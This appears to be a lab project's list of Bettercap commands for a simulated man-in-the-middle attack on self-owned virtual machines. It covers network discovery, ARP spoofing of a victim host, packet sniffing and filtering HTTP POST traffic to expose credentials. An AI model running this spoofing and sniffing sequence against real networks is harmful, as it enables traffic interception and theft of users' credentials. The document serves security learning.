#3 Commands Used – Bettercap MITM Project

This document lists the commands used during the MITM attack simulation project.  
All commands were executed in a controlled lab environment on self-owned virtual machines.

---

## Phase 3 – Network Reconnaissance

### Launch Bettercap from kali linux
``` bash
sudo bettercap
```
### Display Network Interfaces and Hosts
``` bash
net.show
```
### Enable Active Network Discovery
``` bash
net.probe on
```
---

## Phase 4 – MITM Positioning (ARP Spoofing)

### Enable ARP Spoofing Module
``` bash
arp.spoof on
```
### Define Victim Target
``` bash
set arp.spoof.targets <VICTIM_IP>
```
### Enable Full-Duplex MITM
``` bash
set arp.spoof.fullduplex true
```
### Re-enable ARP Spoofing
``` bash
arp.spoof on
```
---

## Phase 5 – Traffic Interception & Analysis

### Enable Packet Sniffing (Bettercap)
``` bash
net.sniff on
```
### View Sniffing Statistics
``` bash
net.sniff.stats
```
### Wireshark Packet Capture (Kali Linux)
``` bash
Start Wireshark
```
``` bash
sudo wireshark
```
---

## Phase 6 – Credential Exposure Analysis

### Filter HTTP Authentication Traffic
``` bash
http.request.method == "POST"
```
### Victim-Side Verification Commands

#### Windows – Check ARP Table
``` bash
arp -a
```
#### Ubuntu – Check ARP Cache
``` bash
ip neigh
```
### Connectivity Verification

#### Windows
``` bash
ping 8.8.8.8
```
#### Ubuntu
``` bash
ping 8.8.8.8
```
## Stop Sniffing
``` bash
net.sniff off
```
## Exit Bettercap
``` bash
quit
```
